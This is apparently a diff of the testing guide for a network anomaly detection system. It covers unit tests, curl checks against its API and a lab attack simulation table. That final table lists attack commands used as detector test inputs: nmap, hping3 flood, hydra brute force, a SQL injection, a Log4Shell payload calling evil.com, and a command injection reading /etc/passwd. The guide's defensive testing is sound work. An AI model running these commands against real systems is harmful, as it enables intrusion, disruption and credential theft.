@@ -1,59 +1,175 @@
-# Testing Guide
+# Network Anomaly Detection (NAD) — Testing & Validation Guide
 
-## 1. Automated smoke tests (fastest)
+Comprehensive testing protocols covering unit tests, API integration tests, ingestion mode switching, remote agent validation, and real-world penetration simulation.
 
-```bash
-make test   # or: /tmp/nadvenv/bin/python -m pytest tests/ -v
-```
+---
 
-6 tests: health, stats shape, alert intel fields (MITRE/remediation/score),
-catalog coverage (8 key detectors), analytics endpoints, signature-engine unit
-(port scan + SQLi + correlation). Requires the backend running on :8000
-(except the unit test).
+## 1. Automated Test Suite
 
-One-shot endpoint check without pytest: `make smoke` (→ `scripts/smoke.sh`).
+The system includes two comprehensive test modules:
+- [`tests/test_connect.py`](file:///home/dereje/project/NAD/tests/test_connect.py): Universal Connect system, interface discovery, agent authentication lifecycle, allowlist IP/CIDR filtering, asset inventory, and dynamic mode switching.
+- [`tests/test_smoke.py`](file:///home/dereje/project/NAD/tests/test_smoke.py): REST API endpoints, telemetry stats shape, MITRE intelligence fields, detector catalog coverage, signature engine unit tests, and v3 attack rules.
 
-## 2. Manual dashboard + API testing
-
-- Dashboard `http://localhost:5173`: LIVE badge, moving throughput chart,
-  alert search (`10.0.0.99`) + severity filter, tabs Overview/Network/Threat Intel.
-- `curl localhost:8000/api/stats`, `/api/alerts?limit=3`, `/api/catalog`,
-  `/api/analytics/top-talkers` — compare against dashboard numbers.
-- Trace one alert end-to-end: alert `src_ip` → top-talkers entry → row in
-  `data/alerts.db` (`sqlite3 data/alerts.db "select * from alerts limit 1;"`).
-
-## 3. Per-detector REPL tests
+### Running Automated Tests:
 
 ```bash
-/tmp/nadvenv/bin/python
->>> from backend.detection.signature_engine import SignatureEngine
->>> sig = SignatureEngine(port_scan_ports=3)
->>> pkt = {"src_ip":"9.9.9.9","dst_ip":"1.1.1.1","src_port":1111,"dst_port":80,
-...        "protocol":"TCP","length":60,"flags":"S","payload_len":0,
-...        "dns_query":"","http_payload":""}
->>> # vary dst_port / http_payload / dns_query per docs/DETECTION_CATALOG.md
+# Run Connect & Agent Unit Tests (independent of running server)
+python3 -m unittest tests/test_connect.py -v
+
+# Run Full Pytest Suite (requires backend running on :8000)
+make test
+# Or directly:
+pytest tests/ -v
 ```
 
-Boundary ideas: DNS query 52 vs 54 chars, 9 vs 11 SSH fails, `FPU` vs `PA` flags.
+### Running Tests Inside Docker:
+```bash
+docker exec nad-backend-1 python3 -m unittest tests/test_connect.py -v
+```
 
-## 4. Real-packet pipeline (no root)
+### One-Shot Shell Smoke Check:
+```bash
+make smoke
+# Or with explicit host:port:
+bash scripts/smoke.sh 127.0.0.1:8000
+```
 
-Craft Scapy packets → `parse_raw()` → engine; proven to fire SYN Flood,
-Port Scan, DNS Tunneling, SQLi. See chat history / re-run the snippet in
-`tests/test_smoke.py::test_signature_unit` style with Scapy objects.
+---
 
-## 5. Lab testing (needs root + 2 VMs, isolated host-only net)
+## 2. Ingestion Mode Validation
 
-Victim runs `make live IFACE=eth0`; attacker (Kali, **your VMs only**):
-`nmap -sS`, `hping3 -S --flood`, `hydra ssh://…`, SQLi via curl.
-Expect each class in attack-mix within ~1s; record detection rate,
-false positives on benign-only runs, and latency (attack start → alert `timestamp`).
+### A. Testing Mode Switching via API
+Verify that the backend transitions cleanly between capture modes without dropping connections:
+```bash
+# 1. Switch to high-intensity simulation
+curl -s -X POST http://127.0.0.1:8000/api/connect/mode \
+  -H "Content-Type: application/json" \
+  -d '{"mode": "simulate", "intensity": "stress", "attacks": ["floods", "scans"]}' | python3 -m json.tool
 
-## 6. Datasets & regression
+# 2. Check current capture status
+curl -s http://127.0.0.1:8000/api/connect/status | python3 -m json.tool
+```
+
+### B. Testing Host Interface Discovery & 10s Packet Probe
+Verify that the system detects your machine's physical network adapters and can sample traffic:
+```bash
+# List all host interfaces with IP, MAC, MTU, and status
+curl -s http://127.0.0.1:8000/api/connect/interfaces | python3 -m json.tool
+
+# Run a 10-second traffic sample on eth0 or lo
+curl -s -X POST http://127.0.0.1:8000/api/connect/interfaces/test \
+  -H "Content-Type: application/json" \
+  -d '{"interface": "lo", "duration": 3}' | python3 -m json.tool
+```
+
+### C. Testing PCAP Replay
+Verify file upload and streaming playback:
+```bash
+curl -X POST http://127.0.0.1:8000/api/connect/pcap/upload \
+  -F "file=@data/sample_attacks.pcap" \
+  -F "speed=5x" | python3 -m json.tool
+
+# Query playback progress
+curl -s http://127.0.0.1:8000/api/connect/pcap/status | python3 -m json.tool
+```
+
+---
+
+## 3. Remote Telemetry Agent Verification
+
+Test the complete agent onboarding and ingestion loop:
+
+### Step 1: Issue an Agent Token
+```bash
+TOKEN_JSON=$(curl -s -X POST http://127.0.0.1:8000/api/agents/tokens \
+  -H "Content-Type: application/json" \
+  -d '{"name": "Lab-PC-01", "site": "Engineering Lab"}')
+echo $TOKEN_JSON
+TOKEN=$(echo $TOKEN_JSON | python3 -c "import sys, json; print(json.load(sys.stdin)['agent']['token'])")
+```
+
+### Step 2: Send Synthetic Telemetry Ingestion
+```bash
+curl -s -X POST http://127.0.0.1:8000/api/agents/ingest \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  -d '{
+    "packets_delta": 450,
+    "bytes_delta": 185000,
+    "pps": 90.0,
+    "top_talkers": [
+      {"ip": "10.0.0.15", "port": 443, "proto": "TCP", "packets": 300, "bytes": 120000}
+    ]
+  }' | python3 -m json.tool
+```
+
+### Step 3: Verify Agent Status in Fleet
+```bash
+curl -s http://127.0.0.1:8000/api/agents | python3 -m json.tool
+```
+The agent should appear with `status: "ONLINE"` and updated packet counters.
+
+---
+
+## 4. Allowlist & Threat Suppression Testing
+
+Verify that legitimate administrative workstations or security scanners do not trigger false alerts:
 
 ```bash
-make train DATASET=data/cicids2017.csv   # prints precision/recall/F1 @ 0.5, 0.7
+# 1. Add allowlist rule for scanner IP
+curl -s -X POST http://127.0.0.1:8000/api/allowlist \
+  -H "Content-Type: application/json" \
+  -d '{"cidr_or_ip": "192.168.1.50", "description": "Nessus Security Scanner"}' | python3 -m json.tool
+
+# 2. Verify rule is registered
+curl -s http://127.0.0.1:8000/api/allowlist | python3 -m json.tool
+
+# 3. Verify suppression via Python unit test
+python3 -c "
+from backend.database.db import db
+assert db.is_allowlisted('192.168.1.50') == True
+assert db.is_allowlisted('192.168.1.99') == False
+print('Allowlist verification SUCCESS')
+"
 ```
 
-Keep a `lab.pcap` (`tcpdump -w`) per scenario and replay after threshold or
-model changes — alerts must reproduce.
+---
+
+## 5. Safe Firewall Remediation Testing
+
+Verify that the engine can generate exact syntax for blocking attacking IPs across multiple operating systems:
+
+```bash
+# Linux iptables rule
+curl -s -X POST http://127.0.0.1:8000/api/alerts/firewall-rule \
+  -H "Content-Type: application/json" \
+  -d '{"ip": "203.0.113.45", "firewall_type": "iptables"}' | python3 -m json.tool
+
+# Windows netsh rule
+curl -s -X POST http://127.0.0.1:8000/api/alerts/firewall-rule \
+  -H "Content-Type: application/json" \
+  -d '{"ip": "203.0.113.45", "firewall_type": "windows-netsh"}' | python3 -m json.tool
+
+# Cisco IOS ACL
+curl -s -X POST http://127.0.0.1:8000/api/alerts/firewall-rule \
+  -H "Content-Type: application/json" \
+  -d '{"ip": "203.0.113.45", "firewall_type": "cisco-acl"}' | python3 -m json.tool
+```
+
+---
+
+## 6. Live Penetration Simulation in an Isolated Lab
+
+> [!WARNING]
+> Conduct active penetration tests **only** against isolated virtual machines or test hardware you own and have explicit authorization to audit.
+
+Set the backend to live capture (`make live IFACE=eth0`). From a secondary test machine (e.g. Kali Linux):
+
+| Attack Category | Test Command | Expected Alert | Detection Time |
+|---|---|---|---|
+| **SYN Port Scan** | `nmap -sS -T4 <TARGET_IP>` | `Port Scan` | < 1 second |
+| **SYN Flood** | `hping3 -S --flood -p 80 <TARGET_IP>` | `SYN Flood` | < 2 seconds |
+| **SSH Brute Force** | `hydra -l root -P pass.txt ssh://<TARGET_IP>` | `SSH Brute Force` | Immediate |
+| **SQL Injection** | `curl "http://<TARGET_IP>:8000/search?q=' UNION SELECT 1,2--"` | `SQL Injection` | Instantaneous |
+| **Log4Shell RCE** | `curl "http://<TARGET_IP>:8000/?q=\${jndi:ldap://evil.com/x}"` | `Log4Shell` | Instantaneous |
+| **Command Injection**| `curl "http://<TARGET_IP>:8000/run?cmd=test;cat /etc/passwd"` | `Command Injection` | Instantaneous |
